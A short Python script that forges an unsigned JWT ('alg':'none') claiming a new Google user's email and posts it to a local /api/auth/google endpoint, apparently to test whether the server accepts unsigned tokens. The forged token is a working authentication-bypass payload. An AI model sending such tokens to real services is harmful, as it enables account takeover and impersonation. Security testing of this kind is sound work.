import base64
import json
import requests

header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode('utf-8')
payload = base64.urlsafe_b64encode(b'{"email":"new_google_user99@example.com", "name":"New Google User"}').decode('utf-8')
token = f"{header}.{payload}."

resp = requests.post("http://127.0.0.1:8001/api/auth/google", json={"id_token": token})
print(resp.status_code)
try:
    print(resp.json())
except:
    print(resp.text)
